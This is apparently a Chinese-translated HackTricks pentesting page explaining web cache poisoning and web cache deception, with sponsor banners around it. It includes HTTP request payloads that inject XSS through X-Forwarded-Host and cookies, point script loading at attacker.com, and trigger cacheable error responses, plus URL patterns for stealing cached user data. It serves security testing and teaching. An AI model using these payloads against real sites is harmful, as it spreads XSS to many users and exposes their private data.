# 缓存投毒和缓存欺骗

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 区别

> **Web缓存投毒和Web缓存欺骗有什么区别？**
>
> * 在**Web缓存投毒**中，攻击者会导致应用程序将一些恶意内容存储在缓存中，并从缓存中向其他应用程序用户提供此内容。
> * 在**Web缓存欺骗**中，攻击者会导致应用程序将属于另一个用户的某些敏感内容存储在缓存中，然后攻击者从缓存中检索此内容。

## 缓存投毒

投毒缓存的目标是使**客户端部分加载意外资源或受攻击者控制的资源**。\
投毒的响应仅会提供给在缓存被投毒时访问受影响页面的用户。因此，影响的程度取决于页面是否受欢迎。

要执行缓存投毒攻击，首先需要**识别无键输入**（不需要出现在缓存请求中但会改变返回页面的参数），查看如何滥用此参数并**获取响应缓存**。

### 发现：检查HTTP头

通常，当响应被**存储在缓存中**时，会有一个**指示的头部**，你可以在这篇文章中查看应该注意的头部：[**HTTP缓存头部**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)。

### 发现：缓存400状态码

如果你认为响应被存储在缓存中，你可以尝试**发送带有错误头部的请求**，应该会返回**状态码400**。然后尝试正常访问请求，如果**响应是400状态码**，则说明存在漏洞（甚至可以执行DoS攻击）。\
一个配置错误的头部可能只是`\:`作为头部。\
请注意，有时这些类型的状态码不会被缓存，因此此测试将无效。

### 发现：识别和评估无键输入

你可以使用[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)来**暴力破解可能会改变页面响应的参数和头部**。例如，页面可能使用头部`X-Forwarded-For`来指示客户端从那里加载脚本：
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### 引发后端服务器的有害响应

通过识别参数/标头，检查它是如何被**清理**的以及它在响应标头中的**反射位置**或影响。你能以任何方式滥用它吗（执行XSS或加载由你控制的JS代码？执行DoS攻击？...）

### 获取响应缓存

一旦你**确定**了可以滥用的**页面**，要使用的**参数/标头**以及**如何**滥用它，你需要获取页面的缓存。根据你尝试缓存的资源，这可能需要一些时间，你可能需要尝试几秒钟。\
响应中的标头**`X-Cache`**可能非常有用，因为当请求未被缓存时，它可能具有值**`miss`**，而当它被缓存时，它可能具有值**`hit`**。\
标头**`Cache-Control`**也很有趣，可以知道资源是否被缓存以及下一次资源将再次被缓存的时间：`Cache-Control: public, max-age=1800`\
另一个有趣的标头是**`Vary`**。该标头通常用于**指示其他标头**，即使它们通常是无键的，也被视为**缓存键的一部分**。因此，如果用户知道受害者的`User-Agent`，他可以为使用特定`User-Agent`的用户污染缓存。\
与缓存相关的另一个标头是**`Age`**。它定义了对象在代理缓存中存在的时间（以秒为单位）。

在缓存请求时，要**小心使用标头**，因为其中一些标头可能会被意外地用作**有键的**，而**受害者需要使用相同的标头**。始终使用**不同的浏览器**测试缓存投毒是否有效。

## 漏洞利用示例

### 最简单的示例

响应中未经清理地反射了类似`X-Forwarded-For`的标头\
你可以发送一个基本的XSS有效负载并污染缓存，这样访问该页面的每个人都将受到XSS攻击：
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_请注意，这将会对`/en?region=uk`的请求进行篡改，而不是`/en`的请求_

### 使用Web缓存篡改来利用Cookie处理漏洞

Cookie也可以在页面的响应中反射。如果你能够滥用它来引发XSS攻击，那么你就可以利用恶意缓存响应中的XSS攻击来攻击多个客户端。
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
请注意，如果易受攻击的cookie被用户广泛使用，常规请求将清除缓存。

### 利用多个头部来利用Web缓存污染漏洞 <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

有时，您需要利用多个无键输入来滥用缓存。例如，如果您将`X-Forwarded-Host`设置为您控制的域，并将`X-Forwarded-Scheme`设置为`http`，则可能会发现一个**开放重定向**。**如果**服务器将所有**HTTP**请求**转发到HTTPS**并使用头部`X-Forwarded-Scheme`作为重定向的域名，您可以通过重定向控制页面指向的位置。
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### 利用有限的`Vary`头进行攻击

如果你发现**`X-Host`**头被用作**加载JS资源的域名**，但响应中的**`Vary`**头指示了**`User-Agent`**。那么，你需要找到一种方法来窃取受害者的User-Agent，并使用该User-Agent来污染缓存：
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### 利用HTTP请求欺骗进行HTTP缓存欺骗攻击

在这里了解如何通过滥用HTTP请求欺骗来执行[缓存欺骗攻击](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)。

### 自动化测试Web缓存欺骗

可以使用[Web缓存漏洞扫描器](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)来自动测试Web缓存欺骗。它支持许多不同的技术，并且高度可定制。

示例用法：`wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 可漏洞示例

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS在URL中转发了片段而没有剥离它，并且仅使用主机、路径和查询生成缓存键（忽略片段）。因此，请求`/#/../?r=javascript:alert(1)`被发送到后端作为`/#/../?r=javascript:alert(1)`，缓存键中没有有效载荷，只有主机、路径和查询。

### GitHub CP-DoS

在内容类型标头中发送错误的值会触发405缓存响应。缓存键包含了cookie，因此只能攻击未经授权的用户。

### GitLab + GCP CP-DoS

GitLab使用GCP存储静态内容。**GCP存储桶**支持**头部`x-http-method-override`**。因此，可以发送头部`x-http-method-override: HEAD`并欺骗缓存返回空响应正文。它还可以支持方法`PURGE`。

### Rack中间件（Ruby on Rails）

Ruby on Rails应用程序通常与Rack中间件一起部署。下面的Rack代码获取**`x-forwarded-scheme`的值，并将其用作请求的方案**。

![](<../.gitbook/assets/image (159) (2).png>)

发送`x-forwarded-scheme: http`头部将导致301重定向到相同的位置，从而导致该资源的DoS，如此示例中所示：

![](<../.gitbook/assets/image (166).png>)

应用程序还可以支持头部`X-forwarded-host`并将用户重定向到该主机，从而可以从攻击者服务器加载JavaScript文件：

![](<../.gitbook/assets/image (157) (2).png>)

### 403和存储桶

以前，**Cloudflare**会**缓存403响应**，因此发送**错误的授权**标头尝试访问**S3**或**Azure存储Blob**将返回一个被缓存的403。Cloudflare不再缓存403响应，但这可能适用于其他代理。

![](<../.gitbook/assets/image (171).png>)

### 注入键参数

很多时候，缓存被配置为**仅将特定GET参数包含在缓存键中**。

例如，Fastly使用Varnish在请求中**缓存了`size`参数**，但如果您同时发送了带有错误值的**`siz%65`**参数，**缓存键**将使用**正确编写的size参数**构建，但**后端**将使用**URL编码参数中的值**。

![](<../.gitbook/assets/image (180).png>)

对第二个`size`参数进行URL编码会导致缓存忽略它，但后端使用它。给参数赋值为0将导致可缓存的400 Bad Request。

### 用户代理规则

由于FFUF或Nuclei等工具生成的流量很大，一些开发人员决定阻止与其用户代理匹配的请求。具有讽刺意味的是，这些调整可能会引入意外的缓存欺骗和DoS机会。

![](<../.gitbook/assets/image (167) (2).png>)

我发现这在多个目标上都有效，使用了来自不同工具或扫描器的用户代理。

### 非法的标头字段

标头名称格式在[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230)中定义如下：

![](<../.gitbook/assets/image (175) (2).png>)

理论上，如果标头名称包含除**tchar**中列出的字符以外的字符，应该拒绝它并返回400 Bad Request。然而，在实践中，服务器并不总是遵守RFC。利用这个细微差别的最简单方法是针对不拒绝无效标头的Akamai进行攻击，而是将其转发并缓存任何400错误，只要缓存控制标头不存在。

![](<../.gitbook/assets/image (163).png>)

发送包含非法字符`\`的标头将导致可缓存的400 Bad Request错误。这是我在测试中最常发现的模式之一。

### 查找新的标头

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## 缓存欺骗

缓存欺骗的目标是使客户端**加载将由缓存保存的资源及其敏感信息**。

首先要注意的是，通常会将`.css`、`.js`、`.png`等**扩展名**配置为**保存在缓存中**。因此，如果访问`www.example.com/profile.php/nonexistent.js`，缓存可能会存储响应，因为它看到了`.js`**扩展名**。但是，如果**应用程序**正在使用存储在 _www.example.com/profile.php_ 中的**敏感**用户内容进行**回放**，您可以从其他用户那里**窃取**这些内容。

其他要测试的内容：

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _使用较少知名的扩展名，如_ `.avif`

在这篇文章中可以找到另一个非常明显的例子：[https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)。\
在这个例子中，解释了如果加载一个不存在的页面，比如_http://www.example.com/home.php/non-existent.css_，将返回 _http://www.example.com/home.php_ 的内容（**包含用户的敏感信息**），并且缓存服务器将保存结果。\
然后，**攻击者**可以在自己的浏览器中访问 _http://www.example.com/home.php/non-existent.css_ 并观察之前访问过的用户的**机密信息**。

请注意，**缓存代理**应该根据文件的**扩展名**（_.css_）而不是基于内容类型进行**配置**来**缓存**文件。在示例中，_http://www.example.com/home.php/non-existent.css_ 的内容类型将是`text/html`而不是`text/css`（这是_.css_文件的预期内容类型）。

在这里了解如何通过滥用HTTP请求欺骗来执行[缓存欺骗攻击](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception)。
## 参考资料

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
